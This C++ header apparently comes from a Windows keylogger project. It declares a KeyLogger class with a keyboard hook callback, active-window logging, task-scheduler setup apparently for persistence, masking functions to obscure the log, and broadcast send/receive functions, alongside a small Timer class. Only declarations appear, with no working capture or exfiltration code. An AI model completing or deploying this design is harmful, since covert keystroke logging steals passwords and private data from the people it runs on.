#pragma once
#include "Windows.h"
#include "fstream"
//#include <codecvt>
#include <chrono>

class Timer
{
public:
	Timer()
	{
		Reset();
	}

	void Reset()
	{
		m_Start = std::chrono::high_resolution_clock::now();
	}

	float ElapsedSeconds()
	{
		return std::chrono::duration_cast<std::chrono::nanoseconds>(std::chrono::high_resolution_clock::now() - m_Start).count() * 0.001f * 0.001f * 0.001f;
	}

	float ElapsedMillis()
	{
		return ElapsedSeconds() * 1000.0f;
	}

private:
	std::chrono::time_point<std::chrono::high_resolution_clock> m_Start;
};

class KeyLogger
{
public:
	KeyLogger() = delete;
	~KeyLogger() = delete;

	static void Init();
	static void Run();
	static void DeInit();
private:
	static HRESULT InitTaskSheduler();

	static LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam);
	static std::u16string ParseChar(char16_t character);
	static std::u16string GetCurrentWindowInfo();
	static void LogCurrentWindowInfo();

	//DEBUG
	static void ReadFromFile();

	static void ApplyMask(char16_t* character);
	static void ApplyMask(std::u16string* str);
	static void ApplyMask(std::wstring* str);
	static void ApplyMask(std::string* str);

	static void SetDirectory();

	static int SendBroadcast();
	static int ReceiveBroadcast();

private:
	static std::wstring s_ApplicationName;
	static HHOOK s_KeyboardHook;
	static std::ofstream s_LogFileStream;
	static uint16_t s_EncodeMask;
	static Timer s_Timer;
	static uint32_t s_TimerThreshold;

	// Use a library instead of deprecated functions?
// 	static std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> s_Utf8To16Converter;
// 	static std::wstring_convert<std::codecvt_utf8<char16_t>, char16_t> s_Utf16To8Converter;
// 	static std::wstring_convert<std::codecvt_utf8<wchar_t>> s_WCharTo8ConverterWChar;
};